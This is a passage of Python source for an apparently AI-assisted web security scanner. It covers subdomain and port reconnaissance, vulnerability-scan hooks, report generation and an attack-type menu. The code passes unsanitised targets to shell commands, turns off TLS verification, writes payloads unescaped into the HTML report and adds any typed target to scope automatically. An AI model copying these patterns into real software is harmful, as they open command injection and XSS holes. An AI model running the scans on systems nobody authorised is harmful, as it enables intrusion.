    """Full reconnaissance: subdomains, DNS, ports, tech, SSL, headers"""

    def __init__(self, domain: str, scope: ScopeManager = None):
        self.domain = domain
        self.scope = scope or ScopeManager([domain])
        self.results: Dict[str, Any] = {}
        self.cache = CacheManager()

    def enumerate_subdomains(self, deep: bool = False) -> List[str]:
        print(Fore.CYAN + "[*] Enumerating subdomains...")
        cached = self.cache.get(f"subs_{self.domain}")
        if cached:
            print(Fore.GREEN + f"    Cached: {len(cached)} subdomains")
            return cached

        subs: Set[str] = set()

        # subfinder
        out = execute_shell_command(f"subfinder -d {self.domain} -silent 2>/dev/null")
        if out:
            subs.update(l.strip() for l in out.splitlines() if l.strip())

        # DNS brute-force
        common = [
            "www", "mail", "ftp", "admin", "blog", "dev", "test", "api",
            "staging", "app", "m", "mobile", "secure", "vpn", "portal",
            "crm", "support", "docs", "status", "demo", "shop", "cloud",
            "ns1", "ns2", "mx", "smtp", "autodiscover", "cpanel", "webmail",
            "git", "jenkins", "jira", "confluence", "grafana", "kibana",
        ]
        if deep or not out:
            for sub in common:
                test = f"{sub}.{self.domain}"
                if execute_shell_command(f"dig +short {test} 2>/dev/null | head -1"):
                    subs.add(test)

        # Certificate transparency
        try:
            r = requests.get(f"https://crt.sh/?q=%.{self.domain}&output=json", timeout=15)
            if r.status_code == 200:
                for entry in r.json():
                    for name in entry.get('name_value', '').split('\n'):
                        name = name.strip().lstrip('*.')
                        if name.endswith(self.domain):
                            subs.add(name)
        except Exception as e:
            logger.debug(f"CT log error: {e}")

        # Wayback Machine
        try:
            wb = requests.get(
                f"http://web.archive.org/cdx/search/cdx?url=*.{self.domain}&output=json&fl=original&collapse=urlkey",
                timeout=15
            )
            if wb.status_code == 200:
                for entry in wb.json()[1:]:
                    url = entry[0] if isinstance(entry, list) else entry
                    parsed = urlparse(url)
                    if parsed.netloc and parsed.netloc.endswith(self.domain):
                        subs.add(parsed.netloc)
        except Exception as e:
            logger.debug(f"Wayback error: {e}")

        result = list(subs)
        self.cache.set(f"subs_{self.domain}", result)
        print(Fore.GREEN + f"    Found {len(result)} subdomains")
        return result

    def dns_records(self) -> Dict:
        print(Fore.CYAN + "[*] Fetching DNS records...")
        records = {}
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "CAA"]:
            out = execute_shell_command(f"dig {rtype} {self.domain} +short 2>/dev/null")
            records[rtype] = out.splitlines() if out else []
        self.results['dns'] = records
        return records

    def port_scan(self, ports: str = "21,22,23,25,53,80,110,143,443,445,3306,3389,6379,8080,8443,27017",
                  aggressive: bool = False) -> Dict:
        print(Fore.CYAN + f"[*] Port scanning ({ports})...")
        try:
            import nmap
            nm = nmap.PortScanner()
            args = "-T4 -sV --version-light" if aggressive else "-T4"
            nm.scan(self.domain, ports, arguments=args)
            open_ports: Dict = {}
            for host in nm.all_hosts():
                open_ports[host] = []
                for proto in nm[host].all_protocols():
                    for port, state in nm[host][proto].items():
                        if state['state'] == 'open':
                            open_ports[host].append({
                                'port': port, 'protocol': proto,
                                'service': state.get('name', 'unknown'),
                                'version': state.get('version', '')
                            })
            self.results['ports'] = open_ports
            return open_ports
        except ImportError:
            logger.warning("python-nmap not installed")
            # Fallback: nmap command
            out = execute_shell_command(
                f"nmap -T4 --open -p {ports} {self.domain} 2>/dev/null"
            )
            self.results['ports'] = {'raw': out or 'nmap not available'}
            return self.results['ports']
        except Exception as e:
            logger.error(f"Port scan error: {e}")
            return {}

    def tech_detection(self, url: str) -> List[str]:
        print(Fore.CYAN + "[*] Detecting technologies...")
        tech = []
        header_clues = {
            'Server': 'Server', 'X-Powered-By': 'Powered-By',
            'X-AspNet-Version': 'ASP.NET', 'X-Drupal-Cache': 'Drupal',
            'X-Generator': 'Generator', 'X-Varnish': 'Varnish',
            'X-Cache': 'Cache', 'X-Shopify-Stage': 'Shopify',
        }
        cookie_clues = {
            'PHPSESSID': 'PHP', 'JSESSIONID': 'Java/JSP',
            'ASP.NET_SessionId': 'ASP.NET', 'laravel_session': 'Laravel',
            'ci_session': 'CodeIgniter', 'django_session': 'Django',
            'rack.session': 'Ruby/Rack',
        }
        try:
            resp = requests.get(url, timeout=10, verify=False)
            for h, label in header_clues.items():
                if h in resp.headers:
                    tech.append(f"{label}: {resp.headers[h]}")
            for c, label in cookie_clues.items():
                if c in resp.cookies:
                    tech.append(f"Framework: {label}")
            soup = BeautifulSoup(resp.text, 'html.parser')
            mg = soup.find('meta', attrs={'name': 'generator'})
            if mg and mg.get('content'):
                tech.append(f"Generator: {mg['content']}")
            ww = execute_shell_command(f"whatweb {url} --short 2>/dev/null")
            if ww:
                tech.append(f"WhatWeb: {ww.strip()[:200]}")
        except Exception as e:
            logger.error(f"Tech detection error: {e}")
        self.results['technologies'] = tech
        return tech

    def check_security_headers(self, url: str) -> Dict:
        print(Fore.CYAN + "[*] Checking security headers...")
        required = {
            'Strict-Transport-Security': 'Enforce HTTPS — prevents protocol downgrade',
            'Content-Security-Policy': 'Mitigates XSS and data injection',
            'X-Frame-Options': 'Prevents clickjacking',
            'X-Content-Type-Options': 'Prevents MIME sniffing',
            'X-XSS-Protection': 'Legacy XSS filter',
            'Referrer-Policy': 'Controls referrer information',
            'Permissions-Policy': 'Restricts browser feature access',
        }
        missing, present = [], []
        try:
            resp = requests.get(url, timeout=10, verify=False)
            for h, desc in required.items():
                if h in resp.headers:
                    present.append(f"{h}: {resp.headers[h]}")
                else:
                    missing.append(f"{h} — {desc}")
        except Exception as e:
            logger.error(f"Header check error: {e}")
        result = {'present': present, 'missing': missing}
        self.results['security_headers'] = result
        return result

    def check_ssl_tls(self) -> Dict:
        print(Fore.CYAN + "[*] Checking SSL/TLS...")
        ssl_info: Dict = {}
        try:
            out = execute_shell_command(
                f"echo | openssl s_client -connect {self.domain}:443 2>/dev/null "
                f"| openssl x509 -text -noout 2>/dev/null | grep -E 'Not After|Subject:|Issuer:'",
                timeout=15
            )
            ssl_info['certificate'] = out.strip() if out else 'Unable to retrieve'

            # Check for weak ciphers
            weak = execute_shell_command(
                f"nmap --script ssl-enum-ciphers -p 443 {self.domain} 2>/dev/null | grep -E 'weak|WEAK'",
                timeout=30
            )
            ssl_info['weak_ciphers'] = weak.strip() if weak else 'None detected'
        except Exception as e:
            logger.error(f"SSL check error: {e}")
        self.results['ssl_tls'] = ssl_info
        return ssl_info

    def vuln_scan_nuclei(self, templates: str = "") -> List[str]:
        print(Fore.CYAN + "[*] Running nuclei scan...")
        tmpl_arg = f"-t {templates}" if templates else ""
        out = execute_shell_command(
            f"echo {self.domain} | nuclei -silent -severity medium,high,critical {tmpl_arg} 2>/dev/null",
            timeout=300
        )
        results = out.splitlines() if out else []
        self.results['nuclei'] = results
        return results

    def crawl_katana(self) -> List[str]:
        print(Fore.CYAN + "[*] Crawling with katana...")
        out = execute_shell_command(
            f"echo {self.domain} | katana -silent -jc -kf -c 30 -d 3 2>/dev/null",
            timeout=120
        )
        results = out.splitlines() if out else []
        self.results['crawled'] = results
        return results

    def run_all(self, deep: bool = False) -> Dict:
        print(Fore.YELLOW + f"\n[*] Full recon on {self.domain}")
        url = f"http://{self.domain}"
        self.results['subdomains']       = self.enumerate_subdomains(deep)
        self.results['dns']              = self.dns_records()
        self.results['ports']            = self.port_scan(aggressive=deep)
        self.results['technologies']     = self.tech_detection(url)
        self.results['security_headers'] = self.check_security_headers(url)
        self.results['ssl_tls']          = self.check_ssl_tls()
        if deep:
            self.results['nuclei']  = self.vuln_scan_nuclei()
            self.results['crawled'] = self.crawl_katana()
        return self.results


# ====================== SARIF Report Generator ======================

def generate_sarif(vulns: List[Vulnerability], filename: str):
    """Export findings in SARIF 2.1.0 format (GitHub/GitLab compatible)"""
    rules = {}
    results = []

    for v in vulns:
        rule_id = f"HSR-{v.vuln_type.upper()}"
        if rule_id not in rules:
            rules[rule_id] = {
                "id": rule_id,
                "name": f"{v.vuln_type.upper()} Vulnerability",
                "shortDescription": {"text": REMEDIATION_DB.get(v.vuln_type, v.vuln_type)[:80]},
                "fullDescription":  {"text": REMEDIATION_DB.get(v.vuln_type, v.vuln_type)},
                "helpUri": f"https://owasp.org/www-community/attacks/{v.vuln_type}",
                "properties": {"tags": ["security", v.vuln_type], "cvss": v.cvss_score}
            }
        results.append({
            "ruleId": rule_id,
            "level": {"Critical": "error", "High": "error",
                      "Medium": "warning", "Low": "note", "Info": "none"}.get(v.severity, "warning"),
            "message": {"text": f"{v.evidence} | Parameter: {v.parameter} | Payload: {v.payload[:80]}"},
            "locations": [{"physicalLocation": {"artifactLocation": {"uri": v.url}}}],
            "properties": {"severity": v.severity, "cvss": v.cvss_score, "cvssVector": v.cvss_vector}
        })

    sarif = {
        "version": "2.1.0",
        "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "HSR Advanced",
                    "version": TOOL_VERSION,
                    "informationUri": "https://github.com/hsr/hsr-advanced",
                    "rules": list(rules.values())
                }
            },
            "results": results
        }]
    }

    sarif_file = f"{filename}.sarif"
    with open(sarif_file, 'w') as f:
        json.dump(sarif, f, indent=2)
    print(Fore.CYAN + f"[+] SARIF report saved: {sarif_file}")


# ====================== PDF Report ======================

class AdvancedPDFReport(FPDF):

    def __init__(self):
        super().__init__()
        self.sev_colors = {
            'Critical': (180, 0, 0), 'High': (220, 50, 50),
            'Medium': (230, 160, 0), 'Low': (50, 150, 50), 'Info': (60, 120, 220)
        }

    def header(self):
        self.set_font('Arial', 'B', 14)
        self.cell(0, 10, 'HSR Advanced v4.0 — Security Assessment Report', 0, 1, 'C')
        self.set_font('Arial', 'I', 9)
        self.cell(0, 8, f'Generated: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}  |  '
                        f'LEGAL: For authorized testing only', 0, 1, 'C')
        self.ln(5)

    def footer(self):
        self.set_y(-15)
        self.set_font('Arial', 'I', 8)
        self.cell(0, 10, f'Page {self.page_no()} — Confidential', 0, 0, 'C')

    def section(self, title: str):
        self.set_font('Arial', 'B', 12)
        self.set_fill_color(40, 40, 80)
        self.set_text_color(255, 255, 255)
        self.cell(0, 10, f'  {title}', 0, 1, 'L', True)
        self.set_text_color(0, 0, 0)
        self.ln(3)

    def add_executive_summary(self, vulns: List[Vulnerability], recon: Dict = None):
        self.section('Executive Summary')
        self.set_font('Arial', '', 10)

        counts: Dict[str, int] = defaultdict(int)
        for v in vulns:
            counts[v.severity] += 1

        self.set_font('Arial', 'B', 10)
        for h, w in [('Severity', 40), ('Count', 30), ('Risk', 80)]:
            self.cell(w, 9, h, 1, 0, 'C')
        self.ln()
        self.set_font('Arial', '', 10)
        risk_map = {'Critical': 'Immediate action required', 'High': 'Remediate urgently',
                    'Medium': 'Plan remediation', 'Low': 'Fix in next cycle', 'Info': 'Informational'}
        for sev in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            if counts[sev]:
                if sev in self.sev_colors:
                    self.set_fill_color(*self.sev_colors[sev])
                self.cell(40, 8, sev, 1, 0, 'C', True)
                self.set_fill_color(255, 255, 255)
                self.cell(30, 8, str(counts[sev]), 1, 0, 'C')
                self.cell(80, 8, risk_map.get(sev, ''), 1, 1)
        self.ln(5)

    def add_vuln_details(self, vulns: List[Vulnerability]):
        self.section('Vulnerability Details')
        for i, v in enumerate(vulns, 1):
            self.set_font('Arial', 'B', 11)
            rgb = self.sev_colors.get(v.severity, (100, 100, 100))
            self.set_text_color(*rgb)
            self.cell(0, 9, f'{i}. [{v.severity}] {v.vuln_type.upper()} — CVSS {v.cvss_score}', 0, 1)
            self.set_text_color(0, 0, 0)
            self.set_font('Arial', '', 9)
            for label, val in [('URL', v.url), ('Parameter', v.parameter),
                                ('Evidence', v.evidence), ('CVSS Vector', v.cvss_vector)]:
                self.set_font('Arial', 'B', 9)
                self.cell(35, 7, f'{label}:', 0, 0)
                self.set_font('Arial', '', 9)
                self.multi_cell(0, 7, str(val)[:120])
            self.set_font('Arial', 'B', 9)
            self.cell(35, 7, 'Payload:', 0, 0)
            self.set_font('Courier', '', 8)
            self.multi_cell(0, 7, v.payload[:150] + ('...' if len(v.payload) > 150 else ''))
            self.set_font('Arial', 'B', 9)
            self.cell(35, 7, 'Remediation:', 0, 0)
            self.set_font('Arial', '', 9)
            self.multi_cell(0, 7, v.remediation[:200])
            self.ln(4)
            if self.get_y() > 260:
                self.add_page()

    def add_recon_section(self, recon: Dict):
        self.section('Reconnaissance Results')
        self.set_font('Arial', '', 9)
        for key in ['subdomains', 'technologies', 'nuclei']:
            items = recon.get(key, [])
            if items:
                self.set_font('Arial', 'B', 10)
                self.cell(0, 8, f'{key.capitalize()} ({len(items)}):', 0, 1)
                self.set_font('Arial', '', 9)
                for item in items[:25]:
                    self.cell(0, 6, f'  • {str(item)[:100]}', 0, 1)
                if len(items) > 25:
                    self.cell(0, 6, f'  ... and {len(items)-25} more', 0, 1)
                self.ln(3)

        headers = recon.get('security_headers', {})
        if headers.get('missing'):
            self.set_font('Arial', 'B', 10)
            self.cell(0, 8, 'Missing Security Headers:', 0, 1)
            self.set_font('Arial', '', 9)
            for h in headers['missing']:
                self.cell(0, 6, f'  ✗ {h}', 0, 1)


# ====================== Reporting Facade ======================

def save_enhanced_report(results: List[Vulnerability], recon_results: Dict = None,
                         filename: str = None,
                         formats: List[str] = None):
    if not filename:
        filename = f"hsr_report_{datetime.datetime.now():%Y%m%d_%H%M%S}"
    if not formats:
        formats = ['txt', 'html', 'json', 'sarif']

    # Deduplicate before reporting
    results = deduplicate(results)

    report_data = {
        'generated': datetime.datetime.now().isoformat(),
        'tool': f'HSR Advanced v{TOOL_VERSION}',
        'summary': {
            'total': len(results),
            'by_severity': defaultdict(int),
            'by_type': defaultdict(int)
        },
        'vulnerabilities': [v.to_dict() for v in results],
        'recon': recon_results
    }
    for v in results:
        report_data['summary']['by_severity'][v.severity] += 1
        report_data['summary']['by_type'][v.vuln_type] += 1

    # ---- JSON ----
    if 'json' in formats:
        jf = f"{filename}.json"
        with open(jf, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
        print(Fore.CYAN + f"[+] JSON report: {jf}")

    # ---- SARIF ----
    if 'sarif' in formats:
        generate_sarif(results, filename)

    # ---- TXT ----
    if 'txt' in formats:
        tf = f"{filename}.txt"
        sev_order = ['Critical', 'High', 'Medium', 'Low', 'Info']
        with open(tf, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write(f"  HSR ADVANCED v{TOOL_VERSION} — SECURITY ASSESSMENT REPORT\n")
            f.write("=" * 80 + "\n\n")
            f.write(f"Generated : {datetime.datetime.now()}\n")
            f.write(f"Findings  : {len(results)} unique vulnerabilities\n\n")
            f.write("SEVERITY BREAKDOWN\n" + "-" * 40 + "\n")
            for s in sev_order:
                c = report_data['summary']['by_severity'].get(s, 0)
                if c:
                    f.write(f"  {s:10}: {c}\n")
            f.write("\nFINDINGS\n" + "-" * 40 + "\n")
            for i, v in enumerate(sorted(results, key=lambda x: {'Critical':0,'High':1,'Medium':2,'Low':3,'Info':4}.get(x.severity, 5)), 1):
                f.write(f"\n{i:3}. [{v.severity}] {v.vuln_type.upper()} — CVSS {v.cvss_score}\n")
                f.write(f"     URL       : {v.url}\n")
                f.write(f"     Parameter : {v.parameter}\n")
                f.write(f"     Evidence  : {v.evidence}\n")
                f.write(f"     Payload   : {v.payload[:120]}\n")
                f.write(f"     Remediate : {v.remediation[:150]}\n")
        print(Fore.CYAN + f"[+] TXT report: {tf}")

    # ---- HTML ----
    if 'html' in formats:
        hf = f"{filename}.html"
        sev_css = {
            'Critical': '#8b0000', 'High': '#cc0000',
            'Medium': '#e67e00', 'Low': '#2e8b57', 'Info': '#2060cc'
        }
        by_sev = report_data['summary']['by_severity']
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HSR Advanced v{TOOL_VERSION} — Security Report</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}}
  .wrap{{max-width:1200px;margin:0 auto;padding:20px}}
  h1{{color:#58a6ff;padding:20px 0 10px;font-size:1.8rem}}
  h2{{color:#8b949e;margin:30px 0 15px;font-size:1.1rem;text-transform:uppercase;letter-spacing:2px}}
  .grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;margin:20px 0}}
  .card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;text-align:center}}
  .card .num{{font-size:2.4rem;font-weight:700;color:#58a6ff}}
  .badge{{display:inline-block;padding:2px 10px;border-radius:12px;font-size:.8rem;font-weight:700;color:#fff}}
  .vuln-card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:10px 0;border-left:4px solid #58a6ff}}
  .vuln-card h3{{font-size:1rem;margin-bottom:8px}}
  .row{{display:flex;gap:8px;margin:4px 0;font-size:.9rem}}
  .lbl{{color:#8b949e;min-width:110px;flex-shrink:0}}
  .code{{background:#0d1117;font-family:monospace;padding:8px;border-radius:4px;font-size:.82rem;word-break:break-all;margin-top:6px;border:1px solid #21262d}}
  .rem{{background:#0f3428;padding:8px;border-radius:4px;font-size:.85rem;margin-top:6px;color:#3fb950}}
  table{{width:100%;border-collapse:collapse;margin:10px 0}}
  th,td{{padding:8px 12px;text-align:left;border-bottom:1px solid #21262d;font-size:.9rem}}
  th{{color:#58a6ff;background:#161b22}}
  footer{{text-align:center;color:#484f58;padding:30px;font-size:.8rem}}
</style>
</head>
<body><div class="wrap">
<h1>🛡 HSR Advanced v{TOOL_VERSION} — Security Report</h1>
<p style="color:#8b949e">Generated: {datetime.datetime.now():%Y-%m-%d %H:%M:%S} &nbsp;|&nbsp; Total findings: <strong style="color:#f0883e">{len(results)}</strong></p>
<h2>Overview</h2>
<div class="grid">
  <div class="card"><div class="num">{len(results)}</div><div>Total Findings</div></div>
"""
        for s in ['Critical', 'High', 'Medium', 'Low']:
            c = by_sev.get(s, 0)
            if c:
                html += f'  <div class="card"><div class="num" style="color:{sev_css[s]}">{c}</div><div>{s}</div></div>\n'

        html += '</div>\n<h2>Vulnerability Details</h2>\n'

        sorted_vulns = sorted(results, key=lambda x: {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3, 'Info': 4}.get(x.severity, 5))
        for i, v in enumerate(sorted_vulns, 1):
            color = sev_css.get(v.severity, '#58a6ff')
            html += f"""<div class="vuln-card" style="border-left-color:{color}">
  <h3>{i}. {v.vuln_type.upper()} &nbsp;<span class="badge" style="background:{color}">{v.severity}</span>
  &nbsp;<span style="color:#8b949e;font-size:.85rem">CVSS {v.cvss_score}</span></h3>
  <div class="row"><span class="lbl">URL:</span><span>{v.url}</span></div>
  <div class="row"><span class="lbl">Parameter:</span><span>{v.parameter}</span></div>
  <div class="row"><span class="lbl">Evidence:</span><span>{v.evidence}</span></div>
  <div class="row"><span class="lbl">CVSS Vector:</span><span style="font-size:.8rem">{v.cvss_vector}</span></div>
  <div class="code">Payload: {v.payload[:200]}</div>
  <div class="rem">💡 Remediation: {v.remediation[:300]}</div>
</div>\n"""

        if recon_results:
            html += '<h2>Reconnaissance</h2>\n'
            subs = recon_results.get('subdomains', [])
            if subs:
                html += f'<h3 style="color:#8b949e;margin:10px 0">Subdomains ({len(subs)})</h3>\n'
                html += '<tr><th>#</th><th>Subdomain</th>\n'
                for i, s in enumerate(subs[:50], 1):
                    html += f'<tr><td>{i}</td><td>{s}</td></tr>\n'
                html += '</table>\n'

            headers = recon_results.get('security_headers', {})
            missing_h = headers.get('missing', [])
            if missing_h:
                html += '<h3 style="color:#8b949e;margin:10px 0">Missing Security Headers</h3>\n<ul style="padding-left:20px">\n'
                for h in missing_h:
                    html += f'<li style="margin:4px 0;color:#f85149">✗ {h}</li>\n'
                html += '</ul>\n'

        html += f'<footer>HSR Advanced v{TOOL_VERSION} — Authorized security testing only.</footer></div></body></html>'

        with open(hf, 'w') as f:
            f.write(html)
        print(Fore.CYAN + f"[+] HTML report: {hf}")

    # ---- PDF ----
    if 'pdf' in formats:
        pf = f"{filename}.pdf"
        try:
            pdf = AdvancedPDFReport()
            pdf.add_page()
            pdf.add_executive_summary(results, recon_results)
            pdf.add_page()
            pdf.add_vuln_details(results)
            if recon_results:
                pdf.add_page()
                pdf.add_recon_section(recon_results)
            pdf.output(pf)
            print(Fore.CYAN + f"[+] PDF report: {pf}")
        except Exception as e:
            logger.error(f"PDF generation error: {e}")
            print(Fore.YELLOW + f"[!] PDF generation failed: {e}")


# ====================== Utility Functions ======================

def execute_shell_command(command: str, timeout: int = 60) -> Optional[str]:
    try:
        result = subprocess.run(
            command, shell=True, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True, timeout=timeout
        )
        return result.stdout if result.returncode == 0 else None
    except subprocess.TimeoutExpired:
        logger.warning(f"Command timeout: {command[:60]}")
        return None
    except OSError as e:
        logger.error(f"OS error running command: {e}")
        return None


def check_external_tools() -> List[str]:
    tools = ["nmap", "subfinder", "httpx", "nuclei", "katana", "dig", "whatweb", "openssl"]
    missing = [t for t in tools if not execute_shell_command(f"which {t} 2>/dev/null")]
    if missing:
        print(Fore.YELLOW + f"[!] Missing tools: {', '.join(missing)}")
    return missing


def normalize_url(url: str) -> Tuple[str, str]:
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"
    parsed = urlparse(url)
    return parsed.netloc, url


def load_payloads_from_file(filepath: str) -> List[str]:
    try:
        with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
            payloads = [l.strip() for l in f if l.strip()]
        print(Fore.GREEN + f"[+] Loaded {len(payloads)} custom payloads from {filepath}")
        return payloads
    except OSError as e:
        print(Fore.RED + f"[!] Could not load payloads: {e}")
        return []


def random_string(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def print_banner():
    print(Fore.CYAN + f"""
╔══════════════════════════════════════════════════════════════════╗
║                     HSR ADVANCED  v{TOOL_VERSION}                         ║
║          AI-Powered Web Security Testing Framework               ║
║                                                                  ║
║  Features: XSS · SQLi · LFI · SSRF · XXE · SSTI · CMD · IDOR   ║
║           JWT · API · GraphQL · WAF Bypass · CVSS · SARIF        ║
║           Local AI (Ollama) or Cloud AI (OpenAI) support         ║
║                                                                  ║
║  ⚠ LEGAL: Use only on systems you own or are authorized to test  ║
╚══════════════════════════════════════════════════════════════════╝
""")


# ====================== Main Tool Class ======================

class HSRAdvancedTool:

    def __init__(self):
        self.config_manager = ConfigManager()
        self.scope = ScopeManager(
            self.config_manager.config.get('scan', {}).get('scope', []),
            SCOPE_FILE if os.path.exists(SCOPE_FILE) else None
        )
        self.ai_engine = self._create_ai_engine_from_config()
        self.results: List[Vulnerability] = []
        self.recon_results: Dict = {}

    def _create_ai_engine_from_config(self) -> EnhancedLocalAIEngine:
        ai_cfg = self.config_manager.config.get('ai', {})
        provider = ai_cfg.get('provider', 'ollama')
        model = ai_cfg.get('model')
        api_key = ai_cfg.get('api_key') or os.environ.get('HSR_AI_API_KEY')
        if provider == 'ollama':
            engine = OllamaEngine(model=model or 'phi')
        elif provider == 'openai':
            engine = RemoteAIEngine(provider='openai', model=model or 'gpt-3.5-turbo', api_key=api_key)
        else:
            engine = None
        return EnhancedLocalAIEngine(engine)

    # ---- UI Helpers ----

    def _menu(self) -> str:
        m = f"""
{Fore.YELLOW}╔{'═'*60}╗
{Fore.YELLOW}║{Fore.WHITE}                        MAIN MENU                          {Fore.YELLOW}║
{Fore.YELLOW}╠{'═'*60}╣
{Fore.YELLOW}║  {Fore.GREEN}1.{Fore.WHITE} Web Vulnerability Scan (AI-guided + WAF bypass)    {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}2.{Fore.WHITE} Full Reconnaissance Scan                           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}3.{Fore.WHITE} API Security Testing                               {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}4.{Fore.WHITE} GraphQL Security Testing                           {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}5.{Fore.WHITE} JWT Token Analysis + Brute-force                  {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}6.{Fore.WHITE} Intelligent Payload Generator                      {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}7.{Fore.WHITE} Advanced Attack (Recon + Vuln + IDOR)             {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}8.{Fore.WHITE} Load Previous Scan Results                        {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}9.{Fore.WHITE} Generate Report                                   {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}10.{Fore.WHITE} Manage Scope                                     {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.GREEN}0.{Fore.WHITE} Exit                                               {Fore.YELLOW}║
{Fore.YELLOW}╚{'═'*60}╝
{Fore.CYAN}Select: {Style.RESET_ALL}"""
        return input(m).strip()

    def _depth(self) -> int:
        print(f"\n{Fore.CYAN}Scan Depth:")
        print(f"  {Fore.GREEN}1.{Fore.WHITE} Quick  (fast, basic checks)")
        print(f"  {Fore.GREEN}2.{Fore.WHITE} Standard (balanced)")
        print(f"  {Fore.GREEN}3.{Fore.WHITE} Deep  (thorough, slower)")
        c = input(f"{Fore.CYAN}Depth [2]: {Style.RESET_ALL}").strip()
        return {'1': 1, '3': 3}.get(c, 2)

    def _custom_payloads(self) -> List[str]:
        c = input("Load custom payload file? (y/n): ").strip().lower()
        if c == 'y':
            fp = input("File path: ").strip()
            return load_payloads_from_file(fp)
        return []

    def _attack_type_menu(self) -> Optional[str]:
        options = {
            '1': None,   # All
            '2': 'xss', '3': 'sql', '4': 'cmd', '5': 'lfi',
            '6': 'ssti', '7': 'ssrf', '8': 'xxe', '9': 'nosql'
        }
        print(f"\n{Fore.CYAN}Attack Types:")
        labels = ['All (AI-guided)', 'XSS', 'SQLi', 'Command Injection',
                  'LFI', 'SSTI', 'SSRF', 'XXE', 'NoSQL']
        for i, l in enumerate(labels, 1):
            print(f"  {Fore.GREEN}{i}.{Fore.WHITE} {l}")
        return options.get(input(f"{Fore.CYAN}Select [1]: {Style.RESET_ALL}").strip(), None)

    def _ask_ai(self) -> EnhancedLocalAIEngine:
        """Interactive AI selection."""
        print(f"\n{Fore.CYAN}AI Configuration:")
        print("  1. Use local Ollama (free, offline)")
        print("  2. Use OpenAI (requires API key)")
        print("  3. No AI (heuristics only)")
        choice = input("Select [1]: ").strip()
        if choice == '2':
            key = input("OpenAI API key: ").strip()
            model = input("Model [gpt-3.5-turbo]: ").strip() or "gpt-3.5-turbo"
            engine = RemoteAIEngine(provider='openai', model=model, api_key=key)
        elif choice == '1':
            model = input("Ollama model [phi]: ").strip() or "phi"
            engine = OllamaEngine(model=model)
        else:
            engine = None
        return EnhancedLocalAIEngine(engine)

    # ---- Menu actions ----

    def web_vuln_scan(self):
        url = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}").strip()
        domain, full_url = normalize_url(url)

        # Auto-add to scope
        if not self.scope.allowed:
            self.scope.allowed.add(domain.split(':')[0])

        depth = self._depth()
        custom = self._custom_payloads()
        attack_type = self._attack_type_menu()

        # Ask for AI if none configured (or override)
        use_ai = input(f"{Fore.CYAN}Use AI (current: {'enabled' if self.ai_engine.ai_engine else 'disabled'})? (y/n): {Style.RESET_ALL}").strip().lower()
        if use_ai == 'y':
            ai_engine = self._ask_ai()
        else:
            ai_engine = EnhancedLocalAIEngine(None)

        threads = {1: 5, 2: 10, 3: 20}.get(depth, 10)

        scanner = EnhancedWebVulnScanner(
            full_url, ai_engine, threads=threads,
            config=self.config_manager.config, scope=self.scope
        )
        results = scanner.scan(attack_type=attack_type, custom_payloads=custom,
                               context={'previous_success': dict(ai_engine.type_success_counts)})
        self.results.extend(results)

        if results:
            ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            save_enhanced_report(results, filename=f"web_scan_{ts}")
        else:
            print(Fore.YELLOW + "[-] No vulnerabilities found.")

    def recon_scan(self):
        url = input(f"{Fore.CYAN}Target domain: {Style.RESET_ALL}").strip()
        domain, _ = normalize_url(url)
        depth = self._depth()

        if not self.scope.allowed:
            self.scope.allowed.add(domain.split(':')[0])

        scanner = EnhancedReconScanner(domain, self.scope)
        results = scanner.run_all(deep=(depth == 3))
        self.recon_results = results

        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        jf = f"recon_{ts}.json"
        with open(jf, 'w') as f:
            json.dump(results, f, indent=2, default=str)

        print(f"\n{Fore.GREEN}[+] Recon complete!")
        print(f"  Subdomains  : {len(results.get('subdomains', []))}")
        print(f"  Technologies: {len(results.get('technologies', []))}")
        print(f"  Missing headers: {len(results.get('security_headers', {}).get('missing', []))}")
        print(Fore.CYAN + f"[+] Saved: {jf}")

    def api_scan(self):
        url = input(f"{Fore.CYAN}API base URL: {Style.RESET_ALL}").strip()
        domain, full_url = normalize_url(url)
        if not self.scope.allowed:
            self.scope.allowed.add(domain.split(':')[0])

        print(Fore.YELLOW + "[*] API security testing...")
        scanner = EnhancedWebVulnScanner(full_url, self.ai_engine, scope=self.scope)
        endpoints = scanner.api_scanner.discover_endpoints()
        print(Fore.GREEN + f"[+] Discovered {len(endpoints)} endpoints")

        api_vulns: List[Vulnerability] = []
        cvss = CVSSCalculator()
        for ep in endpoints[:15]:
            print(Fore.CYAN + f"  [*] {ep}")
            for issue, severity in scanner.api_scanner.test_endpoint_security(ep):
                cs, cv = cvss.calculate('api')
                v = Vulnerability('api', 'endpoint', '', issue, ep,
